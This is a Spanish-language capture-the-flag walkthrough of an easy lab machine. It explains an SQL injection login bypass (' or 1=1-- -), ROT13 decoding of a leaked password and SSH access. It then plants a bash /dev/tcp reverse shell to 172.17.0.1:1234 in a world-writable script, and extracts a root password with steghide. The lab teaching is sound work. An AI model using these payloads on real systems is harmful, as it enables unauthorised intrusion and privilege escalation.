
----------------

>Hoy vamos con una maquinita de "s1egfr1ed"  de dificultada fácil, nos ayudara a reforzar conceptos sencillos de SQInjection y esteganografía:

![Img](/Attachments/Pasted%20image%2020250621022406.png)

>Sin mas empezamos :3
>Levantamos la máquina, descomprimiendo el “.zip” y ejecutando el script de automatización:

![Img](/Attachments/Pasted%20image%2020250621022540.png)

>Probamos conexión con la maquina con algunas trazas ICMP:

![Img](/Attachments/Pasted%20image%2020250621022810.png)
_(Con esto en pocas palabras; enviamos tramas ICMP “Internet Control Message Protocol” tipo (Echo Request) a la ip victima, esta misma, al estar en funcionamiento, revisa las cabeceras del paquete para determinar que es para ella, y responde con un (Echo Reply).)

1. _Podemos ver el orden de estas tramas ICMP en el apartado “icmp_seq=”,
2. _Con el valor de “ttl=” podemos ver el número máximo de saltos que puede dar un paquete antes de descartarse (Por lo general funciona para determinar el sistema operativo víctima)
3. _Con el valor “time=” podemos ver el tiempo entre el “Echo Request” y el “Echo Reply”)

>Ya con la conexión comprobada, haremos un escaneo de puertos, identificando los servicios y versiones:

![Img](/Attachments/Pasted%20image%2020250621023115.png)
1. _-- min-rate 5000 (quiero tramitar mínimo 5000 paquetes por segundo) esto para que el escaneo vaya con bastante agilidad._
2. _-n (no deseo que nmap haga una resolución DNS automática)
3. _-p- (quiero escanear los 65535 puertos del sistema, no los 1000 más comunes, como normalmente hace nmap)._
4. _-Pn (Omite el descubrimiento de Host)_
5. _-sVC (Aquí se concatena el parámetro -sV que realiza un reconocimiento de versiones de servicios, y el parámetro -sC que aplica unos cuantos scripts de reconocimiento propios de nmap_

>Tenemos un servicio SSH en versión OpenSSH 9.2 que no nos da muchas opciones, y un servicio http que por otro lado parece interesante, en versión Apache 2.4.62.
>Ahondamos un poco mas en el puerto 80:

![Img](/Attachments/Pasted%20image%2020250621023513.png)

>Parece que estamos frente a un gestor de datos, pero, la pagina no nos permite hacer nada, parece que ningún botón es funcional. Vamos a por un poco mas de información en el código fuente de la pagina:

![Img](/Attachments/Pasted%20image%2020250621023900.png)
_La linea resaltada nos dice que la web espera ser accedida por el dominio "gatekeeperhr.com", por ello ningún botón funcional, Apache no sirve el contenido de manera propicia porque las solicitudes deberían ser recibidas desde el dominio.

>Así que se esta aplicando Virtual Hosting, para no tener errores con la web, agregaremos el dominio al archivo "/etc/Hosts" de nuestra maquina:

![Img](/Attachments/Pasted%20image%2020250621024945.png)
_Al agregar la linea de relación entre la ip y el dominio, creamos una redirección local, al intentar acceder al dominio "gatekeeperhr.com", nuestra maquina enviara la solicitud a la ip "172.17.0.2" asociada_

>Ahora si, ya con la web mas funcional, inspeccionamos el panel de login:

![Img](/Attachments/Pasted%20image%2020250621025555.png)

>Antes de revisar el código fuente, enumerar directorios, o tal vez fuerza bruta. Testeamos con una comilla si la base de datos tras el panel de login puede ser vulnerable a un SQLI:

![Img](/Attachments/Pasted%20image%2020250621025810.png)

>Vemos que se genero un error en la consulta :3, probablemente el panel es vulnerable.
>Veamos si podemos cambiar la lógica de la consulta, para crear un "Login Bypass":

![Img](/Attachments/Pasted%20image%2020250621030243.png)

_Bien, desglosando un poco lo sucedido: ‘ or 1=1- - -_

_Al ingresar en un panel de login, por lo general, la consulta que se realiza por detrás a una base de datos SQL se ve algo así:_

```sql
SELECT * FROM usuarios WHERE usuario = 'tu usuario' AND password = 'tu contraseña';
```
_Para generar un error en la consulta, ponemos la comilla. esto, por lógica, cerraría el valor esperado de usuario, y quedaría una comilla sobrando en la consulta, lo que la rompe._
```sql
SELECT * FROM usuarios WHERE usuario = ‘’ ’ AND password = 'tu contraseña';
```
_Luego, al inyectar el payload, la consulta quedara algo así:
```sql
SELECT * FROM usuarios WHERE usuario = ‘’ OR 1=1-- - ’ AND password = 'tu contraseña';
```
Al cerrar el valor esperado para “usuario” la consulta devolverá un código de estado falso o negativo, PERO con el operador lógico “or” le decimos a la consulta "si la primera condición (selección de usuario) no es correcta", comprueba otra condición, que sería “1=1”. Como en la lógica de programación 1 siempre será igual a 1, la consulta se toma como verdadera. Por último, con “-- -” comentamos el resto de la consulta SQL, la consulta quedaría algo así:_
```sql
SELECT * FROM usuarios WHERE usuario = ‘’ OR 1=1;
```

_Así que, lo que en pocas palabras se le dice al servidor es “si el usuario es correcto O si 1 es igual a 1 dame una respuesta positiva”.
_Para entenderlo del todo, te recomiendo ir a la biblia del Hacking, donde lo entenderás a la perfección:_[_https://book.hacktricks.wiki/en/pentesting-web/sql-injection/index.html_](https://book.hacktricks.wiki/en/pentesting-web/sql-injection/index.html)

>Funciona :3, hemos bypaseado el login:

![Img](/Attachments/Pasted%20image%2020250621034343.png)

>Bien. En la pagina tenemos 10 Empleados numerados, con información sobre el departamento y fecha de inicio de cada uno:

![Img](/Attachments/Pasted%20image%2020250621034604.png)

>Además de ello, parece no haber nada mas. Como siempre, nos queda el código fuente para obtener mas información:

![Img](/Attachments/Pasted%20image%2020250621034857.png)

>Y nos encontramos con esta pequeña filtración de datos. El comentario nos dice que los empleados pasantes (Valentina y Pedro) podrían tener aun permisos en SSH.
>Antes de intentar una fuerza bruta en SSH con alguno de los dos usuarios, vamos a buscar un poco mas de información, en directorios web --.--

![Img](/Attachments/Pasted%20image%2020250621035521.png)
1. _-c Para que se vea bonito con colorcitos_ ╰(*°▽°*)╯
2. _-w Para especificar el diccionario que se probará en la url (uso un diccionario de [Seclists](https://github.com/danielmiessler/SecLists) )_
3. _-t Para indicarle la cantidad de hilos (tareas múltiples) que deseo para la tarea a realizar, en este caso 200_
4. _-u Indicamos la web a atacar, con la palabra interna FUZZ le indicamos a la herramienta que parte de la url debe ser cambiada por las palabras del el diccionario._
5. _-e Indicamos diferentes terminaciones que deseamos agregar a cada iteración en el diccionario, mientras que las comillas vacías hacen referencia a probar la palabra sin ninguna terminación (ej: -e .txt,.php,”” Probará en la web: palabra.txt, palabra.php y palabra)_

>Tenemos bastantes recursos encontrados:

![Img](/Attachments/Pasted%20image%2020250621040044.png)

>Uno por uno, nos van dando pistas de absolutamente nada, hasta que, inspeccionamos el directorio "Spam" en la web:

![Img](/Attachments/Pasted%20image%2020250621040234.png)

>Tenemos un comentario con una cadena ilegible, tiene buena pinta de ser codificado "ROT 13", ya que la forma del texto se mantiene, pero todas las letras parecen estar invertidas aleatoriamente.
>Pasamos la cadena por [ROT13](rot13.com) para decodificar el contenido

![Img](/Attachments/Pasted%20image%2020250621040937.png)
_ROT13 es un método de codificación bastante simple, se podría decir que es una variante del "Cifrado Cesar", y consiste en la rotación de cada letra 13 posiciones hacia adelante en el alfabeto. Es decir, la A seria N, la O seria B, etc, etc...
La rotación aplica solo para las letras, los símbolos, números o espacios no se modifican de ninguna manera, por eso es relativamente simple identificarlo. También, es fácilmente reversible, así que no es muy usado para ofuscar o ocultar.

>¡¡Tenemos una contraseña!! y dos usuarios, los probamos en SSH:

![Img](/Attachments/Pasted%20image%2020250621042115.png)

>Ingresamos como pedro al sistema, para encontrarnos de golpe con una bonita primera flag:

![Img](/Attachments/Pasted%20image%2020250621165131.png)

>Bien, para el primer movimiento lateral listamos procesos en el sistema, donde nos encontramos con uno muy particular:

![Img](/Attachments/Pasted%20image%2020250621165550.png)
1. _watch es una utilidad en Linux que nos permite ejecutar repetidamente un comando en intervalos de tiempo, puedes verlo como un bucle por tiempo de un comando_
2. _-n 1 es la flag que nos permite determinar el intervalo de actualización del comando, en este caso, deseamos que cada segundo se ejecute nuevamente.
3. _"ps" nos muestra información sobre los procesos en ejecución "Process status"_
4. _"a" nos muestra los procesos de todos los usuarios, no solo del propio_
5. _"u" nos permite ver mas información; como el usuario dueño de un proceso o el uso de memoria_
6. _"x" nos muestra todos los procesos que operan por separado de la terminal; como demonios o servicios en segundo plano._
7. Por ultimo, con "grep 'valentina'" filtramos únicamente por los procesos del usuario Valentina.

![Img](/Attachments/Pasted%20image%2020250621170743.png)

>Vemos que Valentina ejecuta el comando "/bin/sh -c sleep 45; /opt/log_cleaner.sh" de manera cíclica. Listaremos permisos del archivo sobre el que se ejecuta el comando, con algo de suerte:

![Img](/Attachments/Pasted%20image%2020250621171331.png)
_la "w" en la zona izquierda de los permisos hace referencia a writable, y la "r" a readable, en pocas palabras, todos los usuarios del sistema tienen permisos de lectura, y escritura sobre el._

>Tenemos permisos para modificar el archivo, vamos a crear una Revese Shell:

![Img](/Attachments/Pasted%20image%2020250621172156.png)
![Img](/Attachments/Pasted%20image%2020250621172232.png)
1. _bash -i Lanza una bash en modo interactivo (para tener una Shell medianamente funcional)_
2. _>& /dev/tcp/172.17.0.1/1234 0>&1 Es una manera PROPIA de bash para abrir una conexión TCP hacia una ip y un puerto, con la primera parte >& /dev/tcp/ip/puerto dirigimos el stdout (respuestas de la Shell) de la maquina victima a nuestra ip, y con la segunda parte 0>&1 indicamos que el stdin(comandos que insertamos) de nuestra máquina irá a la ip victima para ser interpretado. En pocas palabras, abrimos una comunicación bidireccional entre nuestra ip y la ip victima, redireccionando nuestra entrada estándar (stdin) y la salida estándar de la víctima (stdout)._

>Debemos disponer nuestra máquina para recibir una Shell desde otro equipo, para esto, nos ponemos en escucha por el puerto 1234 con “nc”:

![WhereIsMyWeb Shell](/Attachments/Where%20Is%20My%20Web%20Shell%2014.png)
1. nc Es un binario multipropósito, sirve para ejecutar shells, transferir archivos, enviar y recibir datos, etc, etc…
2. -n Igual que con nmap, este parámetro nos quita la resolución automática de nombres de host (para acelerar el proceso)
3. -l Con este parámetro entramos en un modo de escucha de conexiones
4. -v El modo verbose lo usamos para ver más detalles sobre la escucha e información de la conexión
5. -p con este parámetro indicamos el puerto que estará en escucha, en este caso el 1234

>Y recibimos la Reverse Shell :3

![Img](/Attachments/Pasted%20image%2020250621173112.png)

>Antes de proceder con la escalada de privilegios, hacemos un tratamiento de la TTY para mayor eficiencia:

```bash
 script /dev/null -c bash
```
_Script solicita una PTY (Pseudo terminal) al kernel, luego, ejecuta en el proceso hijo que se crea, el comando que pasamos con la flag "-c", es decir una bash. Por ultimo, script no graba nada de la sesión al redirigirlo al /dev/null (Si no esta script disponible, puedes usar Python: python3 -c 'import pty; pty.spawn("/bin/bash")')._

>Ahora, con un CTRL+Z enviamos la Reverse Shell a segundo plano y desde nuestra terminal:

```bash
stty raw -echo; fg
```
1. _stty es la herramienta que nos ayudara a cambiar los parámetros de la terminal (eco, señales, etc.)
2. _raw es la flag que nos ayudara a desactivar el procesamiento de señales como CTRL+C (para que al hacerlo la Shell no muera) o CTRL+Z (para no poner en segundo plano la Shell por error)
3. _-echo Desactiva el echo del teclado, que nos puede dar problemas
4. _; fg (foreground) devuelve a primer plano nuestra querida Shell O.o

>Por ultimo vamos a establecer las variables de entorno correctas para una Shell totalmente funcional:

```bash
export TERM=xterm
export SHELL=/bin/bash
```
_Le estamos diciendo a la Shell que deseamos que la variable de entorno TERM (responsable de especificar el tipo de terminal usado), sea igual a Xterm.
Sí TERM está mal establecido en la máquina, cosas como clear, nano, vim, less, no funcionaran correctamente. Y luego Establecemos /bin/bash como la Shell por defecto para que otras herramientas lo usen.

>Tenemos la segunda Flag:

![Img](/Attachments/Pasted%20image%2020250621173530.png)

>Y además una imagen, para analizarla, la traemos a nuestro sistema.
>A falta de herramientas comunes de transmisión, vamos a usar Base64 para copiar el archivo completo, y pegar su contenido en nuestro sistema:

![Img](/Attachments/Pasted%20image%2020250621174525.png)
_Base64 es un método de codificación de Binarios, nos puede ayudar cuando necesitamos transmitir imágenes o cadenas complejas por un medio que no lo permite o da errores con caracteres especiales. Es decir, es una manera de convertir un binario o cadena compleja de texto de fácil transmisión.

>Y con todo el texto en base64 copiado, vamos a nuestro sistema, y lo pegamos en un nuevo archivo ".b64":

![Img](/Attachments/Pasted%20image%2020250621175134.png)

>La decodificamos enviando su Stdout a un archivo que será la nueva imagen:

![Img](/Attachments/Pasted%20image%2020250621175705.png)

>Nuestra nueva imagen parece ser simplemente un pequeño troleo del autor:

![Img](/Attachments/Pasted%20image%2020250630033841.png)

>Analizándola un poco de manera simple con Exiftool o Strings no encontramos nada extraño. Pero ya que parece ser el único vector que tenemos, iremos un poco mas profundo, y aprovechando que es ".JPEG" vamos a analizarla con la herramienta joya de la esteganografía en imágenes:

![Img](/Attachments/Pasted%20image%2020250630034316.png)
_StegHide es una Herramienta de esteganografía un poco antigua y limitada a algunos pocos formatos, pero tremendamente potente. Permite la Inserción de archivos en imágenes JPEG de manera discreta y adaptativa. Tiene un cifrado por defecto bastante robusto, y por su manera de distribuir datos de forma pseudoaleatoria con la contraseña, es imposible para un simple mortal extraer los información clara sin ella. Claro que tendrá su altar en nuestra sección de [Esteganografía](/Conceptos%20Y%20Herramientas/Esteganografía/Esteganografía)_
_Afortunadamente para nosotros, el archivo aunque oculto parece no tener contraseña, y lo podemos listar con facilidad_

>Nos encontramos con un archivo "secret.txt", el hecho de que lo pudiéramos listar con "StegHide" quiere decir que esta ocultación fue hecha con esta misma herramienta (La herramienta solo puede detectar o extraer archivos ocultados por ella misma).
>Así bien, usaremos la misma herramienta para extraerlo:

![Img](/Attachments/Pasted%20image%2020250630041024.png)
_Usamos el subcomando extract para definir como operación "Extracción", y con "-sf" incorporamos el archivo victima del procedimiento. Todo lo anterior resulta en la extracción de nuestro querido archivo "Secret.txt"

>Que tiene dentro de si, una contraseña:

![Img](/Attachments/Pasted%20image%2020250630041915.png)

>Que termina siendo de root :3

![Img](/Attachments/Pasted%20image%2020250630042001.png)
